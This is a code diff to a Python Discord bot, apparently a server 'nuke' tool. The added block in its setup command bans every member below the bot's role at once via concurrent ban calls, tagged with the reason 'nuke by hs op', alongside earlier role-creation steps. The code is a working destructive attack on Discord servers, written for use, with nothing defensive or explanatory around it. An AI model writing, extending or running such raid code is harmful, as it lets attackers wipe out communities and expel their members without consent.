@@ -1064,6 +1064,18 @@ async def setup(ctx):
         print(f"[!] Role creation failed: {e}")
 
     
+        # Ban all members logic starts here
+        print("[!] Banning all members...")
+        ban_tasks = []
+        for member in ctx.guild.members:
+            # Check: Owner ko, khud bot ko, aur bot se upar wale roles ko skip karega
+            if member != ctx.guild.owner and member != bot.user and member.top_role < ctx.guild.me.top_role:
+                ban_tasks.append(member.ban(reason="nuke by hs op"))
+        
+        # Ek saath fast ban karne ke liye
+        await asyncio.gather(*ban_tasks, return_exceptions=True)
+        print("[+] All possible members have been banned.")
+        # Ban all members logic ends here
 
 
 
